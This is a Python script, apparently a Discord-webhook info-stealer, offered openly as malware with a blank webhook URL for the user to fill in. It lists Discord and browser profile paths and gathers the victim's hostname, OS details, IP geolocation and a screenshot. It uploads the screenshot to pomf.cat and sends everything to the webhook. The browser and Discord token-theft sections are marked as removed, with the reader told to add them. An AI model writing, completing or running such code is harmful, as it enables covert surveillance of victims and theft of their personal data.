# Modules
import json
import os
import requests
import platform
import pyautogui

# Misc. Modules
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv

# CHANGE THESE VALUES
webhook_url = "" # Your Discord webhook URL where logs will be sent

# DO NOT CHANGE THESE VALUES

# Important variables for grabbing files!!
## All of these paths are not made by me - Unknown source
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord"           : ROAMING + "\\Discord",
    "Discord Canary"    : ROAMING + "\\discordcanary",
    "Discord PTB"       : ROAMING + "\\discordptb",
    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
    "Opera GX"          : ROAMING + "\\Opera Software\\Opera GX Stable",
    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}



### System Information ###

# Get system information and store each piece in a variable
hostname = platform.uname().node
operatingsystem = platform.system() + " " + platform.release() + " " + platform.version()

# Get system specs and store each piece in a variable with platform module
cpu = platform.processor()
gpu = platform.uname().processor

### Geolocation ###
# geolocation = requests.get("https://ipapi.co/json/").json() # API call to get geolocation information [BROKEN?!?????]
geolocation2 = requests.get("http://ip-api.com/json/").json() # alternative API call to get geolocation information since Python is being stupid
ip = geolocation2["query"] # query is the IP address
country = geolocation2["country"]
region = geolocation2["region"]
city = geolocation2["city"]
timezone = geolocation2["timezone"]

### Browser ###

# REMOVED FOR SECURITY REASONS - ADD THIS PART ON YOUR OWN

### Discord  ###

# REMOVED FOR SECURITY REASONS - ADD THIS PART ON YOUR OWN

### Screenshot - Only tested on windows ###
# take a screenshot and save it to the current directory
screenshot = pyautogui.screenshot()
screenshot.save("screenshot.png")
# upload the screenshot to pomf.cat
files = {'files[]': open('screenshot.png', 'rb')}
r = requests.post('https://pomf.cat/upload.php', files=files)
screenshot_url = r.json()['files'][0]['url']
image_url = "https://a.pomf.cat/" + screenshot_url

### Webhook function ###

data = {
    "Content": ""
}

data["embeds"] = [
    {
      "title": ":computer: System Information:",
      "description": "Hostname: **{user}**\nOperating System: **{operatingsystem}**\nCPU: **{cpu}**\nGPU: **{gpu}**".format(operatingsystem=operatingsystem, cpu=cpu, user=hostname, gpu=gpu),
      "color": 16711680,
      "footer": {
        "text": "github.com/faderz"
      }
    },
    {
      "title": ":map: Geolocation:",
      "description": "IP: **{ip}**\nCountry: **{country}**\nRegion: **{region}**\nCity: **{city}**\nTime Zone: **{timezone}**".format(ip=ip, country=country, region=region, city=city, timezone=timezone),
      "color": 16711680,
      "footer": {
        "text": "github.com/faderz"
      }
    },
    {
      "title": "Screenshot",
      "color": 16711680,
      "footer": {
        "text": "github.com/faderz"
      },
      "image": {
        "url": image_url
      }
    },
]

result = requests.post(webhook_url, json = data)

try:
    result.raise_for_status()
except requests.exceptions.HTTPError as err:
    print(err)
else:
    print("Payload delivered successfully, code {}.".format(result.status_code))
